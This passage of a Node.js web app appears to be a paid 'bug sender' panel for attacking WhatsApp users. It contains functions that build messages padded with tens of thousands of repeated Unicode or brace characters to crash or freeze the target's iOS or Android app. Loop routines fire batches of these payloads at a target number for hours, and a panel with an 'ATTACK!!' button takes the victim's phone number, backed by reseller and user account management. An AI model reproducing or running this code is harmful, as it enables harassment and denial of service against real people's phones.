AAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
                caption: "This is an ad caption",
              },
              placeholderKey: {
                remoteJid: "0@s.whatsapp.net",
                fromMe: false,
                id: "ABCDEF1234567890",
              },
              expiration: 86400,
              ephemeralSettingTimestamp: "1728090592378",
              ephemeralSharedSecret:
                "ZXBoZW1lcmFsX3NoYXJlZF9zZWNyZXRfZXhhbXBsZQ==",
              externalAdReply: {
                title: "©De Vlaucs",
                body: "CHANGLI CRASH IOS" + "𑜦࣯".repeat(200),
                mediaType: "VIDEO",
                renderLargerThumbnail: true,
                previewTtpe: "VIDEO",
                thumbnail:
                  "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7p5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
                sourceType: " x ",
                sourceId: " x ",
                sourceUrl: "https://t.me/NEWCHANGLI",
                mediaUrl: "https://t.me/NEWCHANGLI",
                containsAutoReply: true,
                renderLargerThumbnail: true,
                showAdAttribution: true,
                ctwaClid: "ctwa_clid_example",
                ref: "ref_example",
              },
              entryPointConversionSource: "entry_point_source_example",
              entryPointConversionApp: "entry_point_app_example",
              entryPointConversionDelaySeconds: 5,
              disappearingMode: {},
              actionLink: {
                url: "https://t.me/NEWCHANGLI",
              },
              groupSubject: "Example Group Subject",
              parentGroupJid: "6287888888888-1234567890@g.us",
              trustBannerType: "trust_banner_example",
              trustBannerAction: 1,
              isSampled: false,
              utm: {
                utmSource: "utm_source_example",
                utmCampaign: "utm_campaign_example",
              },
              forwardedNewsletterMessageInfo: {
                newsletterJid: "6287888888888-1234567890@g.us",
                serverMessageId: 1,
                newsletterName: " target ",
                contentType: "UPDATE",
                accessibilityText: " target ",
              },
              businessMessageForwardInfo: {
                businessOwnerJid: "0@s.whatsapp.net",
              },
              smbcayCampaignId: "smb_cay_campaign_id_example",
              smbServerCampaignId: "smb_server_campaign_id_example",
              dataSharingContext: {
                showMmDisclosure: true,
              },
            },
          },
        },
        Ptcp
          ? {
              participant: {
                jid: target,
              },
            }
          : {}
      );
    }

    //

    async function SuperIOSCore(target) {
      Ataa.relayMessage(
        target,
        {
          extendedTextMessage: {
            text: `OVERLOAD 𝐼⃪𝑂⃪𝑆 -` + "࣯ꦾ".repeat(90000),
            contextInfo: {
              fromMe: false,
              stanzaId: target,
              participant: target,
              quotedMessage: {
                conversation: "𝐵⃪𝐿⃪𝐴⃪𝑁⃪𝐾 𝐼⃪𝑂⃪𝑆 ‌" + "꧒꧆".repeat(90000),
              },
              disappearingMode: {
                initiator: "CHANGED_IN_CHAT",
                trigger: "CHAT_SETTING",
              },
            },
            inviteLinkGroupTypeV2: "DEFAULT",
          },
        },
        {
          participant: {
            jid: target,
          },
        },
        {
          messageId: null,
        }
      );
    } 
    async function ForceInvisibleCoreNew(target) {
  try {
    let message = {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: "HEHA",
              hasMediaAttachment: false,
              locationMessage: {
                degreesLatitude: -999.035,
                degreesLongitude: 922.999999999999,
                name: "HEHA",
                address: "\u200D",
              },
            },
            body: {
              text: "HEHA",
            },
            nativeFlowMessage: {
              messageParamsJson: "{".repeat(100000),
            },
            contextInfo: {
              participant: target,
              mentionedJid: ["0@s.whatsapp.net"],
            },
          },
        },
      },
    };

    await Ataa.relayMessage(target, message, {
      messageId: null,
      participant: { jid: target },
      userJid: target,
    });
  } catch (err) {
    console.log(err);
  }
}

// ---------------------------------------------------------------------------\\
async function DelayAndro(durationHours, X) {
const totalDurationMs = durationHours * 60 * 60 * 1000;
const startTime = Date.now(); let count = 0;

const sendNext = async () => {
    if (Date.now() - startTime >= totalDurationMs) {
        console.log(`Stopped after sending ${count} messages`);
        return;
    }

    try {
        if (count < 1) {
            await Promise.all([
            XProtexDelay(X),
            OtaxCrashInvisible(X),
            VerloadForceDelMsg(X),
            InvisibleFc(X),
            XProtexBlankChatV5(X),
            KontolInvis(X),
            wraperosXjustin(X),
            XStromForce(X),
            csnith(X),
            qNested(X),
            TraVisZap(X),
            desnith(X),
            oricallforce(X),
            Flood(X),
            fluids(X),
            DocBlank(X),
            AudioFlood(X),
            sFuck(X)
            ]);
            await sleep(2000);
            console.log(chalk.red(`
            ┌────────────────────────┐
            │ ${count}/10 Andro 📟
            └────────────────────────┘
`));
            count++;
            setTimeout(sendNext, 300);
        } else {
            console.log(chalk.green(`Success Sending Bug to ${X}`));
            count = 0;
            console.log(chalk.red("Next Sending Bug"));
            setTimeout(sendNext, 30 * 1000);
        }
    } catch (error) {
        console.error(`❌ Error saat mengirim: ${error.message}`);
        

        setTimeout(sendNext, 100);
    }
};

sendNext();

}

// ---------------------------------------------------------------------------\\
async function DelayAndro2(durationHours, X) {
const totalDurationMs = durationHours * 60 * 60 * 1000;
const startTime = Date.now(); let count = 0;

const sendNext = async () => {
    if (Date.now() - startTime >= totalDurationMs) {
        console.log(`Stopped after sending ${count} messages`);
        return;
    }

    try {
        if (count < 10) {
            await Promise.all([
            DelayInvisible(X),
            LocationInvisible(X),
            FreezeXDelay2(X),
            FreezeXDelay1(X),
            LocationUi(X)
            ]);
            await sleep(2000);
            console.log(chalk.red(`
            ┌────────────────────────┐
            │ ${count}/10 Andro 📟
            └────────────────────────┘
`));
            count++;
            setTimeout(sendNext, 300);
        } else {
            console.log(chalk.green(`Success Sending Bug to ${X}`));
            count = 0;
            console.log(chalk.red("Next Sending Bug"));
            setTimeout(sendNext, 30 * 1000);
        }
    } catch (error) {
        console.error(`❌ Error saat mengirim: ${error.message}`);
        

        setTimeout(sendNext, 100);
    }
};

sendNext();

}
// ---------------------------------------------------------------------------\\
async function FcIos(durationHours, X) {
const totalDurationMs = durationHours * 60 * 60 * 1000;
const startTime = Date.now(); let count = 0;

const sendNext = async () => {
    if (Date.now() - startTime >= totalDurationMs) {
        console.log(`Stopped after sending ${count} messages`);
        return;
    }

    try {
        if (count < 10) {
            await Promise.all([
            SuperIosCore(X),
            IosChatCore(X),
            XiosVirusCore(X),
            BlankIphoneCore(X),
            InvisIphoneCore(X),
            CrashiPhoneCore(X),
            UpiCrashCore(X),
            VenCrashCore(X),
            CrashIosCore(X),
            SmCrashCore(X),
            SqCrashCore(X),
            FBiphoneCore(X),
            iPhoneCore(X),
            ChangliIosCore(X),
            IPhoneAttackCore(X),
            SuperIOSCore(X),
            ForceInvisibleCoreNew(X),
            ]);
            await sleep(2000);
            console.log(chalk.red(`
            ┌────────────────────────┐
            │ ${count}/10 iOS 📟
            └────────────────────────┘
`));
            count++;
            setTimeout(sendNext, 300);
        } else {
            console.log(chalk.green(`Success Sending Bug to ${X}`));
            count = 0;
            console.log(chalk.red("Next Sending Bug"));
            setTimeout(sendNext, 30 * 1000);
        }
    } catch (error) {
        console.error(`❌ Error saat mengirim: ${error.message}`);
        

        setTimeout(sendNext, 100);
    }
};

sendNext();

}


const executionPage = (
  status = "🟥 Ready",
  detail = {},
  isForm = true,
  userInfo = {},
  message = "",
  mode = "",
  successToast = false
) => {
  const { username, expired } = userInfo;
  const formattedTime = expired
    ? new Date(expired).toLocaleString("id-ID", {
        timeZone: "Asia/Jakarta",
        year: "2-digit",
        month: "2-digit",
        day: "2-digit",
        hour: "2-digit",
        minute: "2-digit",
      })
    : "-";

  return `
<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>🔥 Overload-X Panel</title>
  <link rel="icon" href="https://files.catbox.moe/nv8rrj.jpg" type="image/jpg">
  <link href="https://cdnjs.cloudflare.com/ajax/libs/bootstrap/4.0.0/css/bootstrap.min.css" rel="stylesheet">
  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;600&family=Poppins:wght@400;600&display=swap" rel="stylesheet">
  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" rel="stylesheet">
  <script src="https://cdn.jsdelivr.net/gh/jnicol/particleground/jquery.particleground.min.js"></script>
  <style>
    :root {
      --bg-color: #0d0d1e;
      --text-color: #e0e0ff;
      --primary-color: #00ffff;
      --secondary-color: #8a2be2;
      --box-bg: rgba(13, 13, 30, 0.7);
      --box-border: #00ffff;
    }
    * { box-sizing: border-box; margin: 0; padding: 0; }
    body {
      font-family: 'Poppins', sans-serif;
      background: var(--bg-color);
      color: var(--text-color);
      min-height: 100vh;
      padding: 20px;
      position: relative;
      overflow-y: auto;
    }
    #particles {
      position: fixed;
      top: 0; left: 0;
      width: 100%; height: 100%;
      z-index: 0;
    }
    .box {
      border: 2px solid var(--box-border);
      border-radius: 15px;
      padding: 25px;
      margin-bottom: 20px;
      background: var(--box-bg);
      position: relative;
      z-index: 1;
      backdrop-filter: blur(5px);
      box-shadow: 0 0 20px rgba(0, 255, 255, 0.2);
      transition: all 0.3s ease;
    }
    .box:hover {
      transform: translateY(-5px);
      box-shadow: 0 10px 30px rgba(0, 255, 255, 0.4);
    }
    .main-logo {
      width: 100px;
      filter: drop-shadow(0 0 15px var(--primary-color));
      animation: neonGlow 2s infinite alternate;
    }
    .username-text {
      font-size: 24px;
      color: var(--primary-color);
      font-weight: 600;
      text-align: center;
      margin-bottom: 8px;
      text-shadow: 0 0 10px var(--primary-color);
    }
    .status-badge {
      font-size: 16px;
      color: #fff;
      font-weight: bold;
      padding: 5px 15px;
      border-radius: 20px;
      display: inline-flex;
      align-items: center;
      justify-content: center;
      gap: 8px;
      animation: pulseGlow 1.5s infinite;
      margin-bottom: 15px;
    }
    .status-badge.online { background: #32cd32; box-shadow: 0 0 10px #32cd32; }
    .status-badge.offline { background: #ff4500; box-shadow: 0 0 10px #ff4500; }
    .status-badge::before {
      content: '';
      width: 10px;
      height: 10px;
      border-radius: 50%;
      display: inline-block;
      animation: pulse 2s infinite;
    }
    .status-badge.online::before { background-color: #fff; }
    .status-badge.offline::before { background-color: #fff; }
    input[type="text"] {
      width: 100%;
      padding: 16px;
      border-radius: 12px;
      background: rgba(0, 0, 0, 0.4);
      border: 2px solid var(--primary-color);
      color: var(--text-color);
      margin-bottom: 20px;
      font-family: 'Poppins', sans-serif;
      transition: border-color 0.3s;
    }
    input[type="text"]:focus {
      outline: none;
      border-color: var(--secondary-color);
      box-shadow: 0 0 10px var(--secondary-color);
    }
    .buttons-grid {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(140px, 1fr));
      gap: 15px;
    }
    .mode-btn {
      font-size: 14px;
      font-weight: 600;
      padding: 15px 12px;
      background-color: var(--box-bg);
      color: var(--primary-color);
      border: 2px solid var(--primary-color);
      border-radius: 12px;
      cursor: pointer;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 8px;
      transition: all 0.3s ease;
    }
    .mode-btn:hover {
      background-color: rgba(0, 255, 255, 0.1);
      transform: scale(1.05);
      box-shadow: 0 0 15px var(--primary-color);
    }
    .mode-btn.selected {
      background: var(--secondary-color);
      color: #fff;
      border-color: var(--secondary-color);
      box-shadow: 0 0 15px var(--secondary-color);
    }
    .mode-btn.full { grid-column: span 2; }
    @media (max-width: 500px) { .mode-btn.full { grid-column: span 1; } }
    .execute-button {
      background: var(--primary-color);
      color: var(--bg-color);
      padding: 16px;
      width: 100%;
      border-radius: 12px;
      font-weight: bold;
      border: none;
      margin-top: 25px;
      cursor: pointer;
      transition: all 0.3s;
      box-shadow: 0 0 10px var(--primary-color);
    }
    .execute-button:hover:not(:disabled) {
      background: var(--secondary-color);
      color: #fff;
      box-shadow: 0 0 20px var(--secondary-color);
    }
    .execute-button:disabled {
      background: #333;
      color: #888;
      cursor: not-allowed;
      opacity: 0.6;
      box-shadow: none;
    }
    .footer-action-container {
      display: flex;
      flex-wrap: wrap;
      justify-content: center;
      align-items: center;
      gap: 10px;
    }
    .footer-button {
      background: rgba(0, 255, 255, 0.1);
      border: 1px solid var(--primary-color);
      border-radius: 10px;
      padding: 10px 15px;
      font-size: 14px;
      color: var(--text-color);
      display: flex;
      align-items: center;
      gap: 8px;
      transition: all 0.3s ease;
    }
    .footer-button:hover {
      background: rgba(0, 255, 255, 0.3);
      box-shadow: 0 0 10px var(--primary-color);
    }
    .footer-button a { color: var(--text-color); text-decoration: none; }
    .info-section {
      display: flex;
      flex-direction: column;
      gap: 15px;
      margin-top: 20px;
    }
    .info-card {
      background: rgba(0, 0, 0, 0.2);
      padding: 15px;
      border-radius: 10px;
      border: 1px solid var(--primary-color);
      display: flex;
      align-items: center;
      gap: 15px;
    }
    .info-card i {
      font-size: 24px;
      color: var(--primary-color);
    }
    .info-card .text {
      font-size: 16px;
      font-weight: 500;
    }
    .progress-bar-container {
      width: 100%;
      background: rgba(255, 255, 255, 0.1);
      border-radius: 8px;
      overflow: hidden;
      margin-top: 5px;
    }
    .progress-bar {
      height: 10px;
      background: linear-gradient(90deg, #00ffff, #8a2be2);
      width: 0;
      border-radius: 8px;
      transition: width 1s ease-in-out;
      animation: progressBarAnim 2s ease-in-out forwards;
    }
    .progress-label {
      font-size: 12px;
      text-align: right;
      margin-top: 5px;
      font-weight: bold;
      color: var(--primary-color);
    }
    .toast-container {
      display:none; position:fixed; top:20px; right:20px;
      max-width: 300px;
      background: var(--secondary-color); color:white;
      padding:16px 24px;
      border:2px solid var(--primary-color); border-radius:15px;
      font-family:'Poppins', sans-serif;
      font-size:16px; font-weight:500;
      line-height:1.6;
      white-space: pre-line;
      box-shadow:0 0 20px rgba(0,0,0,0.6);
      z-index:9999;
      opacity: 0;
      transform: translateX(100%);
      transition: all 0.5s ease-out;
    }
    .toast-container.show {
      opacity: 1;
      transform: translateX(0);
    }
    @keyframes neonGlow {
      from { filter: drop-shadow(0 0 10px var(--primary-color)); }
      to { filter: drop-shadow(0 0 20px var(--secondary-color)); }
    }
    @keyframes pulseGlow {
      0%, 100% { box-shadow: 0 0 10px rgba(50, 205, 50, 0.8); }
      50% { box-shadow: 0 0 20px rgba(50, 205, 50, 1); }
    }
    @keyframes progressBarAnim {
      from { width: 0; }
      to { width: var(--progress-width); }
    }
  </style>
</head>
<body>
  <div id="particles"></div>
  <div class="container">
    <div class="box text-center mb-4">
      <img src="https://files.catbox.moe/nv8rrj.jpg" class="main-logo" alt="Overload-X Logo">
      <h1 class="username-text mt-3 mb-2">Welcome, ${username || 'Kepforannas'}</h1>
      <div class="status-badge online">
        <i class="fas fa-satellite-dish"></i> Bot Status: Online
      </div>
    </div>

    <div class="box">
      <h2 class="text-center mb-3 text-white">Execution Panel</h2>
      <input type="text" id="targetNumber" placeholder="Masukan nomor target. Contoh: 628xxxxxxxxxx" />
      <div class="buttons-grid">
        <button class="mode-btn" data-mode="androdelay2"><i class="fa fa-bug"></i> Zklol - KILL UI</button>
        <button class="mode-btn" data-mode="androdelay"><i class="fa fa-bug"></i> Zklol - CRASH HARD</button>
        <button class="mode-btn full" data-mode="iosfc"><i class="fa fa-bug"></i> Zklol - KILL IOS</button>
      </div>
      <button class="execute-button" id="executeBtn" disabled><i class="fas fa-rocket"></i> ATTACK!!</button>
    </div>

    <div class="box info-section">
      <h3 class="text-white mb-3">System Information</h3>
      <div class="info-card">
        <i class="fas fa-battery-full"></i>
        <div class="text">Battery: <span id="batteryStatus">Calculating...</span></div>
      </div>
      <div class="info-card">
        <i class="fas fa-network-wired"></i>
        <div class="text">IP Address: <span id="ipAddress">Loading...</span></div>
      </div>
      <div class="info-card">
        <i class="fas fa-laptop-code"></i>
        <div class="text">Skills:</div>
        <div class="flex-grow-1 ml-2">
          <div class="mb-2">
            <span class="d-block">Javascript 10%</span>
            <div class="progress-bar-container"><div class="progress-bar" style="--progress-width: 10%;"></div></div>
          </div>
          <div class="mb-2">
            <span class="d-block">HTML 20%</span>
            <div class="progress-bar-container"><div class="progress-bar" style="--progress-width: 20%;"></div></div>
          </div>
          <div class="mb-2">
            <span class="d-block">CSS 34%</span>
            <div class="progress-bar-container"><div class="progress-bar" style="--progress-width: 34%;"></div></div>
          </div>
          <div class="mb-2">
            <span class="d-block">PHP 17%</span>
            <div class="progress-bar-container"><div class="progress-bar" style="--progress-width: 17%;"></div></div>
          </div>
        </div>
      </div>
    </div>

    <div class="box">
      <div class="footer-action-container">
        ${userInfo.role === "owner" || userInfo.role === "reseller" || userInfo.role === "admin" ? `
          <div class="footer-button"><a href="/userlist"><i class="fas fa-users-cog"></i> Manage User</a></div>
        ` : ""}
        <div class="footer-button"><a href="https://t.me/@Alpooooooofoluv" target="_blank"><i class="fab fa-telegram"></i> Developer</a></div>
        <div class="footer-button"><a href="/logout"><i class="fas fa-sign-out-alt"></i> Logout</a></div>
        <div class="footer-button"><i class="fas fa-user"></i> ${username || 'Unknown'} &nbsp;|&nbsp; <i class="fas fa-hourglass-half"></i> ${formattedTime}</div>
      </div>
    </div>

  </div>

  <div id="toast" class="toast-container"></div>

  <script>
    $(document).ready(function() {
      $('#particles').particleground({
        dotColor: 'var(--primary-color)',
        lineColor: 'var(--secondary-color)',
        minSpeedX: 0.1, maxSpeedX: 0.6,
        minSpeedY: 0.1, maxSpeedY: 0.6,
        density: 10000,
        particleRadius: 3,
        proximity: 100,
      });

      const inputField = document.getElementById('targetNumber');
      const modeButtons = document.querySelectorAll('.mode-btn');
      const executeBtn = document.getElementById('executeBtn');
      let selectedMode = null;

      function isValidNumber(number) {
        return /^(62|0)8\\d{7,13}$/.test(number);
      }

      function showToast(message, type = 'info') {
        const toast = document.getElementById('toast');
        toast.innerText = message;
        toast.className = 'toast-container show';
        if (type === 'success') {
          toast.style.background = '#32cd32';
          toast.style.borderColor = '#228b22';
        } else if (type === 'error') {
          toast.style.background = '#ff4500';
          toast.style.borderColor = '#cc3700';
        } else {
          toast.style.background = 'var(--secondary-color)';
          toast.style.borderColor = 'var(--primary-color)';
        }
        setTimeout(() => {
          toast.className = 'toast-container';
        }, 5000);
      }

      modeButtons.forEach(button => {
        button.addEventListener('click', () => {
          modeButtons.forEach(btn => btn.classList.remove('selected'));
          button.classList.add('selected');
          selectedMode = button.getAttribute('data-mode');
          executeBtn.disabled = false;
        });
      });

      executeBtn.addEventListener('click', () => {
        const number = inputField.value.trim();
        if (!isValidNumber(number)) {
          showToast("Target tidak valid. Harus dimulai dengan '62' atau '0' diikuti 8-13 digit.", 'error');
          return;
        }
        showToast("Bug berhasil dikirim. Tunggu sebentar...", 'success');
        setTimeout(() => {
          window.location.href = '/execution?mode=' + selectedMode + '&target=' + number;
        }, 1500);
      });

      // Fetch battery status
      if ('getBattery' in navigator) {
        navigator.getBattery().then(function(battery) {
          function updateBatteryStatus() {
            const level = (battery.level * 100).toFixed(0);
            document.getElementById('batteryStatus').innerText = level + '%';
          }
          updateBatteryStatus();
          battery.addEventListener('levelchange', updateBatteryStatus);
        });
      } else {
        document.getElementById('batteryStatus').innerText = 'Not Supported';
      }

      // Fetch IP Address
      $.getJSON("https://api.ipify.org?format=json", function(data) {
        document.getElementById("ipAddress").innerText = data.ip;
      }).fail(function() {
        document.getElementById("ipAddress").innerText = "Failed to load";
      });

      // Handle query parameters for toasts
      window.addEventListener('DOMContentLoaded', () => {
        const urlParams = new URLSearchParams(window.location.search);
        const toastMessage = urlParams.get('toast');
        if (toastMessage) {
          showToast(decodeURIComponent(toastMessage));
          history.replaceState({}, '', window.location.pathname);
        }
      });

      // Animate progress bars
      const progressBars = document.querySelectorAll('.progress-bar');
      progressBars.forEach(bar => {
        const width = bar.style.getPropertyValue('--progress-width');
        setTimeout(() => {
          bar.style.width = width;
        }, 100);
      });
    });
  </script>
</body>
</html>
`;
};



// Appp Get root Server \\
app.use(bodyParser.urlencoded({ extended: true }));


app.get("/", (req, res) => {
  const username = req.cookies.sessionUser;
  const role = req.cookies.sessionRole;
  const isLoggedIn = req.cookies.isLoggedIn;

  if (username && role && isLoggedIn === "true") {
    const users = getUsers();
    const user = users.find(u => u.username === username && u.role === role);

    // Pastikan user ditemukan & belum expired
    if (user && (!user.expired || Date.now() < user.expired)) {
      return res.redirect("/execution");
    }
  }

  // Jika belum login / expired, arahkan ke halaman login awal
  const filePath = path.join(__dirname, "web", "index.html");
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("❌ Gagal baca Login.html");
    res.send(html);
  });
});

app.get("/login", (req, res) => {
  const username = req.cookies.sessionUser;
  const users = getUsers();
  const currentUser = users.find(u => u.username === username);

  // Jika masih login dan belum expired, langsung lempar ke /execution
  if (username && currentUser && currentUser.expired && Date.now() < currentUser.expired) {
    return res.redirect("/execution");
  }

  const filePath = path.join(__dirname, "web", "Login.html");
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("❌ Gagal baca file Login.html");
    res.send(html);
  });
});

app.post("/auth", (req, res) => {
  const { username, password } = req.body;
  const users = getUsers();
  const user = users.find(u => u.username === username && u.password === password);

  if (!user || (user.expired && Date.now() > user.expired)) {
    return res.redirect("/login?msg=Login%20gagal%20atau%20expired");
  }

  // Cek apakah sedang login di device lain
  if (user.isLoggedIn && user.role !== "owner") {
  return res.redirect("/login?msg=User%20sudah%20login%20di%20device%20lain");
}

  // Set user sebagai login
  user.isLoggedIn = true;
    console.log(`[ ${chalk.green('LogIn')} ] -> ${user.username}`);
  saveUsers(users);

  const oneDay = 24 * 60 * 60 * 1000;

  res.cookie("sessionUser", username, {
  maxAge: 24 * 60 * 60 * 1000, // 1 hari
  httpOnly: true,
  sameSite: "lax"
});
res.cookie("sessionRole", user.role, {
  maxAge: 24 * 60 * 60 * 1000,
  httpOnly: true,
  sameSite: "lax"
});
  return res.redirect("/execution");
});


app.get("/userlist", (req, res) => {
  const role = req.cookies.sessionRole;
  const currentUsername = req.cookies.sessionUser;

  if (!["reseller", "admin" , "owner"].includes(role)) {
    return res.send("🚫 Akses ditolak.");
  }

  const users = getUsers();

  const tableRows = users.map(user => {
    const isProtected =
  user.username === currentUsername || // tidak bisa hapus diri sendiri
  (role === "reseller" && user.role !== "user") || // reseller hanya hapus user
  (role === "admin" && (user.role === "admin" || user.role === "owner")) || // admin gak bisa hapus admin/owner
  (role !== "owner" && user.role === "owner"); // selain owner gak bisa hapus owner

    return `
      <tr>
        <td>${user.username}</td>
        <td>${user.role.charAt(0).toUpperCase() + user.role.slice(1)}</td>
        <td>${new Date(user.expired).toLocaleString("id-ID")}</td>
        <td>
            ${isProtected ? `<span class="icon-disabled">
  <i class="fas fa-times"></i>
</span>` : `  
                <form method="POST" action="/hapususer" style="display:inline">
                <input type="hidden" name="username" value="${user.username}" />
                <button type="submit" style="margin-right:10px;">Delete</button>
        </form>
  `}
  ${(
  role === "owner" ||
  (role === "admin" && (user.role === "user" || user.role === "reseller")) ||
  (role === "reseller" && user.role === "user")
)
      ? `
      <a href="/edituser?username=${user.username}"><button>Edit</button></a>
      `: ""}
    </td>
      </tr>
    `;
  }).join("");

  const html = `
<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Daftar User</title>
  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet" />
  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&family=Orbitron:wght@400;600&display=swap" rel="stylesheet">
  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
  <script src="https://cdn.jsdelivr.net/gh/jnicol/particleground/jquery.particleground.min.js"></script>
  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; }

    body {
  font-family: 'Poppins', sans-serif;
  background: #000;
  color: #3C44D5;
  min-height: 100vh;
  padding: 16px;
  position: relative;
  overflow-y: auto;
  overflow-x: hidden;
}

    #particles {
      position: fixed;
      top: 0; left: 0;
      width: 100%; height: 100%;
      z-index: 0;
    }

    .content {
      position: relative;
      z-index: 1;
    }

    h2 {
      text-align: center;
      margin-bottom: 16px;
      color: #2B33DD;
      font-size: 22px;
      font-family: 'Poppins', sans-serif;
    }

    .table-container {
      overflow-x: auto;
      border-radius: 10px;
      border: 1px solid #2C2BE2;
      background: rgba(0, 0, 0, 0.6);
      backdrop-filter: blur(5px);
      font-size: 14px;
      margin-bottom: 20px;
    }

    table {
      width: 100%;
      border-collapse: collapse;
      min-width: 360px;
    }
    
    label {
      display: block;
      margin-bottom: 8px;
      font-weight: 600;
      color: #263BEE;
      font-family: 'Poppins', sans-serif;
    }

    th, td {
      padding: 10px;
      text-align: left;
      border-bottom: 1px solid #2B2CE2;
      white-space: nowrap;
    }

    th {
      background: rgba(26, 0, 26, 0.8);
      color: #2B2EFF;
    }

    td {
      background: rgba(13, 0, 13, 0.7);
    }

    button {
      background: #2B4DE2;
      color: white;
      padding: 6px 10px;
      border: none;
      border-radius: 6px;
      cursor: pointer;
      font-size: 13px;
    }

    .icon-disabled {
  display: inline-flex;
  align-items: center;
  justify-content: center;
  width: 64px;
  height: 32px;  
  color: #ff5555;
  font-size: 18px;
  border-radius: 6px;
}

   .icon-disabled i {
  pointer-events: none;
}

    .back-btn, #toggleFormBtn {
  display: block;
  width: 100%;
  padding: 14px;
  margin: 16px auto;
  background: #000B82;
  color: white;
  text-align: center;
  border-radius: 10px;
  text-decoration: none;
  font-size: 15px;
  font-weight: bold;
  font-family: 'Poppins', sans-serif;
  border: none;
  cursor: pointer;
  transition: 0.3s;
  box-sizing: border-box;
}

    #userFormContainer {
      display: none;
      margin-top: 20px;
      background: rgba(0, 2, 26, 0.8);
      padding: 20px;
      border-radius: 10px;
      border: 1px solid #2B3BE2;
      backdrop-filter: blur(5px);
    }

    #userFormContainer input,
    #userFormContainer select {
      padding: 10px;
      width: 100%;
      border-radius: 8px;
      border: none;
      background: #01001A;
      color: #2748EC;
      margin-bottom: 12px;
    }

    #userFormContainer button[type="submit"] {
      width: 100%;
      padding: 14px;
      background: #2B61E2;
      color: white;
      border: none;
      border-radius: 10px;
      font-weight: bold;
      cursor: pointer;
      transition: 0.3s;
      box-sizing: border-box;
      margin-top: 10px;
      font-family: 'Poppins', sans-serif;
    }

    @media (max-width: 600px) {
      h2 { font-size: 18px; }
      table { font-size: 13px; }
      th, td { padding: 8px; }
      button, .back-btn, #toggleFormBtn { font-size: 13px; }
    }
  </style>
</head>
<body>
  <div id="particles"></div>

  <div class="content">
    <h2>List User</h2>

    <div class="table-container">
      <table>
        <thead>
          <tr>
            <th>Username</th>
            <th>Role</th>
            <th>Expired</th>
            <th>Action</th>
          </tr>
        </thead>
        <tbody>
          ${tableRows}
        </tbody>
      </table>
    </div>

    <button id="toggleFormBtn"><i class="fas fa-user-plus"></i> Add User</button>

<div id="userFormContainer">
  <form action="/adduser" method="POST">
    <label>Username</label>
    <input type="text" name="username" placeholder="Username" required>
    <label>Password</label>
    <input type="text" name="password" placeholder="Password" required>
    <label>Durasi</label>
    <input type="number" name="durasi" placeholder="Duration (days)" required min="1">
    
    <label>Role</label>
    <select id="roleSelect" name="role" required></select>

    <button type="submit">Add User</button>
  </form>
</div>

    <a href="/execution" class="back-btn"><i class="fas fa-arrow-left"></i> Dashboard</a>
    
<script>
  const currentRole = "${role}";
  const roleOptions = {
    owner: ["user", "reseller", "admin"],
    admin: ["user", "reseller"],
